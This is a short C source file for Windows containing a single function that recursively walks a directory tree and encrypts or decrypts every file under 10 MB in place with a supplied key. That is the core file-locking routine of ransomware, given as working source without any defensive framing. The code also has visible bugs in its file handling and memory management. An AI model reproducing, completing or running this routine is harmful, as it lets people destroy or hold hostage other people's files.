#include "file.h"

void all_files_enc_dec(char* dir, char* key, BOOL mode) {
    char  filename[BUFF_SIZE];
    intptr_t hFile;
    struct _finddatai64_t c_file;
    intptr_t hFile2;

    char all[BUFF_SIZE];
    strcpy(all, dir);
    strcat(all, "*.*");
    hFile = _findfirsti64(all, &c_file);
    int dirlen = strlen(dir);
    _findnexti64(hFile, &c_file);

    while (!_findnexti64(hFile, &c_file)) {
        struct _finddatai64_t c_file2;
        int filenamelen = strlen(c_file.name);
        char* file = malloc(dirlen + filenamelen + 2);
        strcpy(file, dir);
        strcat(file, c_file.name);

        hFile2 = _findfirsti64(file, &c_file2);
        if (hFile2 != -1) _findclose(hFile2);
        if (hFile2 == -1) continue;
        else if (c_file2.attrib & _A_SUBDIR) {
            strcat(file, "\\");
            all_files_enc_dec(file, key, mode);
        }
        else {
            if (mode) {
                FILE* fp = fopen(file, "rb+");
                if (!fp) { free(file); continue; }
                fseek(fp, 0, SEEK_END);
                int size = ftell(fp);
                if (size == -1 || size > 10000000) { fclose(fp); free(file); continue; }
                char* pt = malloc(size);
                char* enc = malloc(size + 16);
                memset(pt, 0, size);
                memset(enc, 0, size);
                fseek(fp, 0, SEEK_SET);
                fread(pt, size, 1, fp);
                int encsize = encrypt(key, pt, enc, size);
                fseek(fp, 0, SEEK_SET);
                fprintf(fp, "%d", encsize);
                fwrite(enc, encsize, 1, fp);
                fclose(fp);
            }
            else {
                FILE* fp = fopen(file, "rb");
                if (!fp) { free(file); continue; }
                fseek(fp, 0, SEEK_END);
                int size = ftell(fp);
                if (size == -1 || size > 10000000) { fclose(fp); free(file); continue; }
                fseek(fp, 0, SEEK_SET);
                fscanf(fp, "%d", &size);
                char* pt = malloc(size);
                char* enc = malloc(size);
                memset(pt, 0, size);
                memset(enc, 0, size);
                fread(enc, size, 1, fp);
                int decsize = decrypt(key, enc, pt, size);
                fclose(fp);
                fp = fopen(file, "wb");
                fwrite(pt, decsize, 1, fp);
                fclose(fp);
            }
        }
        free(file);
    }
}